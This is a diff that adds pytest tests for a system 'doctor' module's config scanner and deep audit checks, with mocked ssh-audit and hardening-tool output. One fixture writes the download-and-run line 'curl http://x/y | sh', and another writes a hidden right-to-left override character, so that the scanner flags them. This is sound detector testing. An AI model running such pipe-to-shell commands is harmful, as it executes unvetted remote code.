@@ -80,3 +80,31 @@ def test_exit_code_and_render():
     assert doctor.exit_code(r) == 2 and "napraw" in doctor.render(r)
     assert doctor.exit_code([doctor.Result(FAIL, "c")]) == 1
     assert doctor.exit_code([doctor.Result(PASS, "d")]) == 0
+
+
+def test_config_scan(tmp_path):
+    from app.doctor import check_config_scan, scan_config
+    clean = tmp_path / "a.service"
+    clean.write_text("[Service]\nExecStart=/bin/true\n")
+    assert check_config_scan([tmp_path])[0].status == "PASS"
+    (tmp_path / "b.conf").write_text("x\u202ey\n")
+    (tmp_path / "c.sh").write_text("curl http://x/y | sh\n")
+    found = scan_config([tmp_path])
+    assert len(found) == 2
+    assert check_config_scan([tmp_path])[0].status == "FAIL"
+
+
+def test_deep_without_tools(monkeypatch):
+    import app.doctor as d
+    monkeypatch.setattr(d.shutil, "which", lambda _n: None)
+    res = d.check_deep(lambda _c: (0, ""))
+    assert [r.status for r in res] == ["WARN", "WARN"]
+
+
+def test_deep_with_tools(monkeypatch):
+    import app.doctor as d
+    monkeypatch.setattr(d.shutil, "which", lambda n: "/usr/bin/" + n)
+    def sh(cmd):
+        return (0, "(kex) x [fail] bad\n") if cmd[0] == "ssh-audit" else (0, "Hardening index : 82 [####]")
+    res = d.check_deep(sh)
+    assert res[0].status == "FAIL" and res[1].status == "PASS"
